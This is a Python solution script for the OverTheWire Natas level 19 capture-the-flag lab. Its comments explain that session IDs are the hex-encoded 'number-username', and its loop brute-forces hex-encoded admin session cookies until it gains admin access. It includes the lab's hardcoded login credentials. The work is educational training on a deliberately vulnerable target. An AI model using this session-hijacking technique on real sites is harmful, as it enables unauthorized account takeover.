#!/usr/bin/env python3
'''
3:37
Level 19 → Level 20

    str = '...' literals = a sequence of Unicode characters (Latin-1, UCS-2 or UCS-4, depending on the widest character in the string)
    bytes = b'...' literals = a sequence of   integers between 0 and 255


github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas19.py


https://www.youtube.com/watch?v=QWZxzAz_gys&list=PL1H1sBF1VAKWM3wMCn6H5Ql6OrgIivt2V&index=17

Username: natas19
URL:      http://natas19.natas.labs.overthewire.org
username = 'natas19'
password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
problem:

write up:
  There  is no source code for this problem but the according to the output
  message:
   This page uses mostly the same code as the previous level, but session IDs
   are no longer sequential...

The output  of session.post is:
session.cookies =>  <RequestsCookieJar[<Cookie PHPSESSID=3234342d706c for natas19.natas.labs.overthewire.org/>]>
and the first digits in  PHPSESSID=3234342d706c changing if we run this again and again
The last digit  does not change.Those  digit depends on the user name.
If we send empty user nmase the last 2 digits are:  '2d'.
The full string  is '3337332d'
Finly we  came to conclusion the structre is 'random number-username'
The nubers are like natas 18:  in range(1, 641)
'''
import string

import requests
#pip uninstall uuid pip install uuid
import re
from string import *

from time import *

characters = string.ascii_lowercase + string.ascii_uppercase + string.digits


from pyodbc import lowercase


username = 'natas19'
password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
response = session.get(url, auth = (username, password) )

content = response.text

results =re.findall('Password', content)[0]
print (results)



i = 281# This is the sloution.The way to find it is in the loop
adminUser = str("%d-admin" % i)
print (adminUser, ' ',(adminUser).encode("utf-8"), ' ',(adminUser).encode("utf-8").hex() )

cookies = dict(PHPSESSID=(adminUser).encode("utf-8").hex())
response = requests.get(url,
                        auth=(username, password),
                        cookies=cookies)
print (response.text)



for i in range(270, 640):

 adminUser = str("%d-admin" % i)   # 0-admin ..  640-admin
 cookies = dict(PHPSESSID=(adminUser).encode("utf-8").hex())
 response = session.get(url,
                        cookies=cookies ,
                        auth=(username, password)
                        )
 print('[ ',i,' ] ',adminUser,' ',cookies)
 if ("You are an admin" in response.text):
 	print ("Got it!", i)
 	print (response.text)
 	break
 
